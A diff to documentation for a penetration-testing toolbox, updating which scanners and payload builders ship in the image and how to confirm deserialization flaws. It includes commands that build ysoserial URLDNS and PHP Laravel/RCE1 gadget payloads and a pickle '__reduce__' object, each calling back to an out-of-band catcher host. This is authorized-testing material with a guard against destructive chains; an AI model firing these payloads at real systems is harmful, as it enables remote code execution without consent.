@@ -24,17 +24,21 @@ class.
 
 | tool | role | in the toolbox image? |
 |---|---|---|
-| Web-Cache-Vulnerability-Scanner (`wcvs`) | candidates only | no. Kali package `web-cache-vulnerability-scanner` or `go install github.com/Hackmanit/Web-Cache-Vulnerability-Scanner@latest` |
-| smuggler.py (defparam) | candidates only, documented FPs on large CDNs | no. `git clone https://github.com/defparam/smuggler /tmp/smuggler` in the toolbox (lab) |
-| ysoserial / ysoserial.net | payload builder | no (needs Java / Windows .NET) |
-| phpggc | payload builder | no (needs PHP) |
+| Web-Cache-Vulnerability-Scanner (`wcvs`) | candidates only | **yes**, pinned (toolbox/tools.txt) |
+| smuggler.py (defparam) | candidates only, documented FPs on large CDNs | **yes**, pinned at a commit, on PATH as `smuggler.py` |
+| ysoserial | payload builder (Java) | **yes**, `ysoserial-all.jar` v0.0.6 + a JRE, wrapper `ysoserial` |
+| phpggc | payload builder (PHP) | **yes**, pinned at a commit + `php-cli`, wrapper `phpggc` |
+| crlfuzz | candidates only, CRLF / response-header injection | **yes**, v1.4.1, via `scripts/tools crlf` |
 | nuclei (`-tags xxe,deserialization,cache,smuggling`) | candidates only | yes |
 | interactsh-client, lab `oast` catcher | **proof** (OOB) | yes / lab |
 | curl, python3 raw sockets | **proof** (differential pair) | yes |
 
-Tool facts for ysoserial, phpggc and the gadget names below are general
-knowledge, not verified against sources in the research; check `--help` /
-`-l` output before relying on a flag.
+This column used to say "no" for the first four and told you to `go install`
+and `git clone` them at run time. All four have been in the image for several
+releases; verify with `scripts/mythos tools` rather than either claim.
+
+Flags still get checked against `--help` before use — but prefer the wrapper
+where one exists, because it caps and paces what the bare tool does not.
 
 ## Common rules
 
@@ -59,11 +63,26 @@ Signals: `rO0AB` / `aced0005` (Java), `O:<n>:"` / `a:<n>:{` (PHP),
 `gASV` / `\x80\x04` (pickle), `$type` in JSON (.NET), `__VIEWSTATE` without
 MAC, `--- !ruby/object`. See `knowledge/web/deserialization.md`.
 
-Confirm with a gadget whose only effect is a callback:
-- Java: `java -jar ysoserial.jar URLDNS 'http://<token>.<oast-domain>'`
-  (DNS lookup only, no code execution; needs interactsh DNS).
-- PHP: `phpggc -l <framework>` and pick a chain whose type is file read/SSRF-like
-  pointing at `http://oast:8080/<token>`; otherwise a time-based chain.
+Confirm with a gadget whose only effect is a callback. Generating one sends
+nothing, so this step is offline and `scripts/tools gadget` does not touch the
+target at all:
+
+```
+scripts/tools gadget list --lang java --json      # what this image can build
+scripts/tools gadget list --lang php  --json      # with each chain's type and vector
+scripts/tools gadget java URLDNS --cmd 'http://<token>.<oast-domain>' --out p.b64
+scripts/tools gadget php  Laravel/RCE1 'curl http://oast:8080/<token>'
+```
+
+- Java: `URLDNS` is a DNS lookup only, no code execution, and the right first
+  try; `ysoserial` needs the named library version on the target's classpath,
+  which is what `scripts/sbom` tells you.
+- PHP: pick a chain whose type is file read or SSRF-like and point it at the
+  OAST catcher; otherwise a time-based chain.
+- A **File delete** chain and a destructive `--cmd` are refused with exit 3.
+  `hooks/scope-guard.py` refuses data destruction in every mode and no scope
+  rule overrides it, so prove deserialization with the callback instead — which
+  is the oracle a report needs anyway.
 - Python pickle (lab only): an object whose `__reduce__` calls
   `urllib.request.urlopen('http://oast:8080/<token>')`.
 
